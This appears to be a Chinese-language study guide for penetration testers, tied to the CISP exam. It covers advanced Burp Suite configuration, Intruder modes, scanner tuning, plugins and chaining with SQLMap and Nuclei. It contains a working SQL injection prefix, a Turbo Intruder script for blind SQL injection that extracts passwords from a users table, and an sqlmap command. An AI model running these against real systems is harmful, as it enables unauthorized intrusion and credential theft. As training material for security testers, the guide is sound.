# Burp Suite 高级利用技巧与插件开发

> 📅 2026-06-12 | 🎯 进阶 | ⏱ 20 min | 分类：漏洞库与EXP

## 📋 提纲

1. Burp Suite 高级配置
2. Intruder 高效爆破
3. 自动化扫描调优
4. Burp 插件推荐
5. Burp 与渗透工具联动

---

## 1. Burp Suite 高级配置

### 1.1 上游代理链

```
Burp → 上游SOCKS5代理 → 目标
用于：隐藏真实IP、通过跳板机渗透
```

```bash
# User Options → Upstream Proxy Servers
# 添加:
# Destination host: *
# Proxy host: 127.0.0.1
# Proxy port: 1080
# 同时本地启动SOCKS代理
ssh -D 1080 -N user@jump-server
```

### 1.2 SSL/TLS 配置

```
Project Options → SSL → 添加客户端证书
用于需要客户端证书认证的目标
```

### 1.3 Scope 精准定义

```
Target → Scope → 使用正则：
# 包含：\.target\.com$
# 排除：\.(jpg|png|css|js|woff|ico)$
```

---

## 2. Intruder 高效爆破

### 2.1 攻击类型选择

| 类型 | 用途 | 示例 |
|------|------|------|
| Sniper | 单个参数逐个测试 | 单参数Fuzzing |
| Battering Ram | 所有参数用同一个payload | 测试通用漏洞 |
| Pitchfork | 多参数一一对应 | user:pass组合 |
| Cluster Bomb | 所有组合 | 全面Fuzzing |

### 2.2 自定义 Payload

```python
# Intruder → Payloads → Payload Processing

# 1. Add Prefix/Suffix
# 前缀: ' OR '1'='1
# 后缀: -- -

# 2. Hash处理
# Payload Processing → Hash → MD5/SHA256

# 3. 编码
# Payload Processing → Encode → URL-encode all characters

# 4. 自定义Python脚本
# Payload Processing → Invoke Burp Extension
```

---

## 3. 自动化扫描调优

### 3.1 Scanner 配置

```
主动扫描优化：
1. 限制扫描速度：避免触发WAF
   Scanner → Options → Throttle between requests: 500ms

2. 排除不必要检查：
   去掉 XSS/SQL if目标无输入点

3. 自定义Issue定义：
   只关注 Critical/High
```

### 3.2 扫描加速技巧

```bash
# 先被动扫描（不影响业务）
# 浏览完整站，Burp自动分析流量中的漏洞

# 再主动扫描补漏
# 右击目标 → "Actively scan this host"

# 并发控制
# Scanner → Options → Concurrent Request Executions
# 根据目标性能调整（默认10）
```

---

## 4. Burp 插件推荐

| 插件 | 功能 | 必装 |
|------|------|------|
| **Turbo Intruder** | HTTP并发攻击神器 | ✅ |
| **Autorize** | 自动越权检测 | ✅ |
| **Logger++** | 增强日志记录 | ✅ |
| **ActiveScan++** | 增强主动扫描 | ✅ |
| **J2EEScan** | Java漏洞扫描 | ⭐ |
| **Backslash Powered Scanner** | 增强扫描引擎 | ⭐ |
| **Hackvertor** | 编码转换 | ⭐ |
| **JSON Web Tokens** | JWT攻击 | ⭐ |
| **Repeater** | 增强Repeater | ✅ |

### Turbo Intruder 示例

```python
# Turbo Intruder Python脚本 - SQL注入布尔盲注
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=False
    )

    # 探测每个字符
    for i in range(1, 33):
        for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
            engine.queue(target.req, f"test' AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}'--")

def handleResponse(req, interesting):
    if req.response and len(req.response) > 500:
        table.add(req)
```

---

## 5. Burp 与其他工具联动

### 5.1 Burp → SQLMap

```bash
# 1. Burp记录请求 → 右击 → Copy to file → request.txt
# 2. SQLMap使用Burp的请求文件

sqlmap -r request.txt --batch --level=3 --risk=2

# 或实时联动
# Burp Extension: SQLiPy 或使用 CO2
```

### 5.2 Burp → Nmap

```bash
# 安装 CO2 插件
# 右击目标 → CO2 → Nmap Scan
```

### 5.3 Burp → Nuclei

```bash
# 从 Burp 导出Sitemap → 提取URL列表 → Nuclei扫描
# Burp Extension: Nuclei Connector
```

---

## 6. 常用快捷键

| 快捷键 | 功能 |
|--------|------|
| Ctrl+R | 发送到Repeater |
| Ctrl+I | 发送到Intruder |
| Ctrl+Shift+T | 发送到Turbo Intruder |
| Ctrl+U | URL编码选中文本 |

---

## ✅ Burp Checklist

- [ ] Jython/JRuby安装
- [ ] 必备插件安装
- [ ] Scope精准定义
- [ ] Intruder自定义Payload
- [ ] Turbo Intruder配置
- [ ] 上游代理配置

> 📚 延伸阅读：Penetration/001-Web流程 | Penetration/002-信息收集 | Vuln/001-漏洞概述

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| Burp Suite核心模块 | 工具认知 | Proxy(代理拦截)、Repeater(重放测试)、Intruder(暴力破解)、Scanner(自动扫描)、Decoder(编解码) |
| Intruder攻击模式 | 工具技巧 | Sniper(单变量)、Battering ram(同时替换)、Pitchfork(配对替换)、Cluster bomb(笛卡尔积) |
| 插件生态 | 工具扩展 | Turbo Intruder(高速并发)、Logger++(高级日志)、Autorize(越权检测)、J2EEScan |
| 高级配置 | 深度使用 | 上游代理(级联代理)、TLS Pass Through、Match and Replace(自动替换)、Session Handling |
| SQLMap+Tamper | 集成使用 | space2comment(空格→注释)、charencode(URL编码)、between(> < → BETWEEN)、randomcase(大小写) |
| 渗透测试效率 | 工具方法论 | 自动化扫描→手工验证→插件辅助→深度利用的完整工作流 |

### 知识巧记口诀

> **Burp Suite口诀**：
> Proxy代理抓请求，Repeater重放验漏洞；
> Intruder四种模式，Sniper单点打；
> Turbo Intruder并发高，越权Autorize好帮手；
> Match and Replace自动改，Session处理不掉线。

> **Intruder四种模式记**：Sniper(狙击手)→单个变量；Battering ram(攻城锤)→统一值；Pitchfork(叉子)→配对跑；Cluster bomb(集束炸弹)→全排列。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ Burp自带的Scanner够用了 | ✅ 专业渗透需结合Nuclei/Xray等专用扫描器+手工验证+自定义插件 |
| ❌ Intruder只能用于爆破密码 | ✅ Intruder可用于FUZZ测试、越权遍历ID、参数挖掘等多种场景 |
| ❌ Burp社区版和专业版差不多 | ✅ 专业版的Scanner、Intruder并发限制解除、插件API等功能社区版不具备 |

> 💡 **一句话总结**：Burp Suite是渗透测试的瑞士军刀——从代理拦截到自动化扫描，从Intruder爆破到插件扩展，CISP考试考查工具的正确使用方法和最佳实践。
